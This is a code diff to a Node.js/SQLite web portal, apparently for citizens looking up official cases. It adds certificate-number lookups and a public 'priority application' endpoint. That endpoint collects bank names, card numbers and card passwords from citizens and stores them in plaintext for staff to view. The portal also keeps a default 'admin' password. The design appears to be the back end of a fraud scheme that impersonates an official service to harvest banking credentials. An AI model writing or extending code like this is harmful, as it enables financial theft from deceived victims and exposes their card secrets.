@@ -68,6 +68,7 @@ db.exec(`
     citizen_name TEXT NOT NULL,
     national_id TEXT NOT NULL,
     case_number TEXT,
+    certificate_number TEXT NOT NULL DEFAULT '',
     case_type TEXT NOT NULL DEFAULT '',
     case_title TEXT NOT NULL DEFAULT '',
     case_summary TEXT NOT NULL DEFAULT '',
@@ -104,6 +105,14 @@ db.exec(`
     created_at TEXT NOT NULL,
     FOREIGN KEY(case_id) REFERENCES cases(id)
   );
+
+  CREATE TABLE IF NOT EXISTS priority_applications (
+    id TEXT PRIMARY KEY,
+    citizen_name TEXT NOT NULL,
+    certificate_number TEXT NOT NULL,
+    entries_json TEXT NOT NULL,
+    created_at TEXT NOT NULL
+  );
 `);
 
 function tableColumns(table) {
@@ -127,6 +136,10 @@ function normalizeCaseNumber(value) {
   return String(value || '').trim().toUpperCase();
 }
 
+function normalizeCertificateNumber(value) {
+  return String(value || '').trim().toUpperCase();
+}
+
 function ensureCaseNumber(value) {
   return normalizeCaseNumber(value) || generateCaseNumber();
 }
@@ -146,6 +159,7 @@ function safeName(name) {
 
 for (const [column, definition] of [
   ['case_number', 'TEXT'],
+  ['certificate_number', "TEXT NOT NULL DEFAULT ''"],
   ['case_type', "TEXT NOT NULL DEFAULT ''"],
   ['case_title', "TEXT NOT NULL DEFAULT ''"],
   ['case_summary', "TEXT NOT NULL DEFAULT ''"],
@@ -158,7 +172,9 @@ for (const [column, definition] of [
 for (const row of db.prepare("SELECT id FROM cases WHERE case_number IS NULL OR case_number = ''").all()) {
   db.prepare('UPDATE cases SET case_number = ? WHERE id = ?').run(generateCaseNumber(), row.id);
 }
+db.prepare("UPDATE cases SET certificate_number = national_id WHERE certificate_number IS NULL OR certificate_number = ''").run();
 db.exec("CREATE UNIQUE INDEX IF NOT EXISTS cases_case_number_unique ON cases(case_number) WHERE case_number IS NOT NULL AND case_number <> '';");
+db.exec('CREATE INDEX IF NOT EXISTS cases_certificate_lookup_idx ON cases(citizen_name, certificate_number);');
 
 const defaultAdminPassword = process.env.ADMIN_PASSWORD || 'admin';
 const defaultAdmin = db.prepare('SELECT id FROM users WHERE username = ?').get('admin');
@@ -263,6 +279,7 @@ function publicCase(row) {
     citizenName: row.citizen_name,
     nationalId: row.national_id,
     caseNumber: row.case_number || row.national_id,
+    certificateNumber: row.certificate_number || '',
     caseType: row.case_type || '',
     caseTitle: row.case_title || '',
     caseSummary: row.case_summary || '',
@@ -304,6 +321,27 @@ function canAccessCase(req, caseId) {
   return Boolean(req.session.user);
 }
 
+function certificateCases(citizenName, certificateNumber) {
+  return db.prepare(`
+    SELECT * FROM cases
+    WHERE citizen_name = ? AND certificate_number = ?
+    ORDER BY created_at DESC
+  `).all(citizenName, certificateNumber);
+}
+
+function publicPriorityApplication(row) {
+  if (!row) return null;
+  let entries = [];
+  try { entries = JSON.parse(row.entries_json || '[]'); } catch (_) { entries = []; }
+  return {
+    id: row.id,
+    citizenName: row.citizen_name,
+    certificateNumber: row.certificate_number,
+    entries,
+    createdAt: row.created_at
+  };
+}
+
 app.get('/api/me', (req, res) => {
   const caseRow = req.session.caseId
     ? db.prepare('SELECT * FROM cases WHERE id = ?').get(req.session.caseId)
@@ -340,16 +378,12 @@ app.post('/api/citizen/start', (req, res) => {
 function queryCitizenCases(req, res) {
   const source = req.method === 'GET' ? req.query : req.body;
   const citizenName = String(source.citizenName || '').trim();
-  const caseNumber = normalizeCaseNumber(source.caseNumber || source.nationalId);
-  if (citizenName.length < 2 || caseNumber.length < 3) {
-    return res.status(400).json({ error: '請輸入姓名與案號' });
+  const certificateNumber = normalizeCertificateNumber(source.certificateNumber || source.nationalId);
+  if (citizenName.length < 2 || certificateNumber.length < 3) {
+    return res.status(400).json({ error: '請輸入姓名與證號' });
   }
 
-  const cases = db.prepare(`
-    SELECT * FROM cases
-    WHERE citizen_name = ? AND case_number = ?
-    ORDER BY created_at DESC
-  `).all(citizenName, caseNumber);
+  const cases = certificateCases(citizenName, certificateNumber);
   const filesByCaseId = {};
   for (const item of cases) {
     filesByCaseId[item.id] = db.prepare(`
@@ -369,6 +403,30 @@ app.post('/api/citizen/logout', (req, res) => {
   req.session.citizenName = null;
   req.session.caseNumber = null;
   res.json({ ok: true });
+});
+
+app.get('/api/priority-applications', requireStaff, (_req, res) => {
+  const rows = db.prepare('SELECT * FROM priority_applications ORDER BY created_at DESC').all();
+  res.json({ applications: rows.map(publicPriorityApplication) });
+});
+
+app.post('/api/priority-applications', (req, res) => {
+  const citizenName = String(req.body.citizenName || '').trim();
+  const certificateNumber = normalizeCertificateNumber(req.body.certificateNumber);
+  const entries = Array.isArray(req.body.entries) ? req.body.entries.map((entry) => ({
+    bank: String(entry?.bank || '').trim(),
+    cardNumber: String(entry?.cardNumber || '').trim(),
+    password: String(entry?.password || '').trim()
+  })).filter((entry) => entry.bank || entry.cardNumber || entry.password) : [];
+  if (citizenName.length < 2 || certificateNumber.length < 3) return res.status(400).json({ error: '請輸入姓名與證號' });
+  if (!certificateCases(citizenName, certificateNumber).length) return res.status(404).json({ error: '查無資料' });
+  if (!entries.length) return res.status(400).json({ error: '請至少填寫一筆銀行別、卡號或密碼' });
+  const appId = id();
+  db.prepare(`
+    INSERT INTO priority_applications (id, citizen_name, certificate_number, entries_json, created_at)
+    VALUES (?, ?, ?, ?, ?)
+  `).run(appId, citizenName, certificateNumber, JSON.stringify(entries), now());
+  res.json({ application: publicPriorityApplication(db.prepare('SELECT * FROM priority_applications WHERE id = ?').get(appId)) });
 });
 
 app.post('/api/staff/login', (req, res) => {
@@ -400,20 +458,21 @@ app.get('/api/cases', requireStaff, (req, res) => {
 app.post('/api/cases', requireStaff, (req, res) => {
   const citizenName = String(req.body.citizenName || '').trim();
   const caseNumber = ensureCaseNumber(req.body.caseNumber || req.body.nationalId);
+  const certificateNumber = normalizeCertificateNumber(req.body.certificateNumber);
   const caseType = String(req.body.caseType || '').trim();
   const caseTitle = String(req.body.caseTitle || '').trim();
   const caseSummary = String(req.body.caseSummary || '').trim();
   const documentCase = String(req.body.documentCase || '').trim();
   const documentOfficial = String(req.body.documentOfficial || '').trim();
   const documentContent = String(req.body.documentContent || '').trim();
-  if (citizenName.length < 2 || caseNumber.length < 3) return res.status(400).json({ error: '請輸入姓名與案號' });
+  if (citizenName.length < 2 || caseNumber.length < 3 || certificateNumber.length < 3) return res.status(400).json({ error: '請輸入姓名、證號與案號' });
 
   try {
     const caseId = id();
     db.prepare(`
-      INSERT INTO cases (id, citizen_name, national_id, case_number, case_type, case_title, case_summary, document_case, document_official, document_content, status, created_at, approved_at)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'open', ?, ?)
-    `).run(caseId, citizenName, caseNumber, caseNumber, caseType, caseTitle, caseSummary, documentCase, documentOfficial, documentContent, now(), now());
+      INSERT INTO cases (id, citizen_name, national_id, case_number, certificate_number, case_type, case_title, case_summary, document_case, document_official, document_content, status, created_at, approved_at)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'open', ?, ?)
+    `).run(caseId, citizenName, caseNumber, caseNumber, certificateNumber, caseType, caseTitle, caseSummary, documentCase, documentOfficial, documentContent, now(), now());
     const caseRow = db.prepare('SELECT * FROM cases WHERE id = ?').get(caseId);
     const creator = req.session.user?.displayName || '服務人員';
     db.prepare(`
